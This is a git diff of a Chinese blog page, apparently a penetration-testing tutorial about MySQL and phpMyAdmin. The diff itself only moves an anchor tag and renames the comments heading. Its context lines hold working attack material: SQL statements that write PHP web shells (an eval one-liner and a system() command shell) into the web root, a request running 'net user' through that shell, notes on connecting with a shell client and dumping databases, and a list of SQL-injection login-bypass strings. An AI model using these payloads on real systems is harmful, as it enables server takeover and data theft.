@@ -98,7 +98,8 @@ Drop TABLE IF EXISTS moon;
 <pre><code>select &apos;&lt;?php @eval($_POST[pass]);?&gt;&apos;INTO OUTFILE &apos;d:/wamp/www/darkmoon3.php&apos;
 </code></pre><p>拿shell第四种方法</p>
 <pre><code>select &apos;&lt;?php echo \&apos;&lt;pre&gt;\&apos;;system($_GET[\&apos;cmd\&apos;]); echo \&apos;&lt;/pre&gt;\&apos;; ?&gt;&apos; INTO OUTFILE &apos;d:/wamp/www/darkmoon4.php&apos;
-</code></pre><p>127.0.0.1/darkmoon4.php?cmd=net user<br>找到mysql数据库，执行sql语句即可写入一句话，再菜刀连接即可。<br>phpmyadmin脱裤：在这里面是可以直接拖库的，如同上传php拖库脚本一样，操作差不多的。<br>修改mysql默认的root用户名方法:<br>进入phpmyadmin,进入mysql表,执行sql语句<br>         1.update user set user=’你的新root用户名’ where user=’root’;<br>         2.flush privileges;<br>例如：<br>用root身份登入，进入mysql库，修改user表即可。<br>         1.use mysql;<br>         2.mysql&gt;update user set user=’newName’ where user=’root’;<br>         3.mysql&gt; flush privileges;<br><a id="more"></a></p>
+</code></pre><p>127.0.0.1/darkmoon4.php?cmd=net user<br>找到mysql数据库，执行sql语句即可写入一句话，再菜刀连接即可。<br>phpmyadmin脱裤：在这里面是可以直接拖库的，如同上传php拖库脚本一样，操作差不多的。<br>修改mysql默认的root用户名方法:<br>进入phpmyadmin,进入mysql表,执行sql语句<br>         1.update user set user=’你的新root用户名’ where user=’root’;<br>         2.flush privileges;<br>例如：<br>用root身份登入，进入mysql库，修改user表即可。<br>         1.use mysql;<br>         2.mysql&gt;update user set user=’newName’ where user=’root’;<br>         3.mysql&gt; flush privileges;   </p>
+<a id="more"></a>
 <h2 id="0x03-万能密码"><a href="#0x03-万能密码" class="headerlink" title="0x03 万能密码"></a>0x03 万能密码</h2><pre><code>&apos;xor
 &apos;or&apos;=&apos;or&apos;
 &apos;or&apos;&apos;=&apos;&apos;or&apos;&apos;=&apos;
@@ -240,7 +241,7 @@ function chencklogin()
 </article>
 
 
-  <h1 class="title">Comments</h1>
+  <h1 class="title">Kommentare</h1>
 
   
       <div id="fb-root"></div>
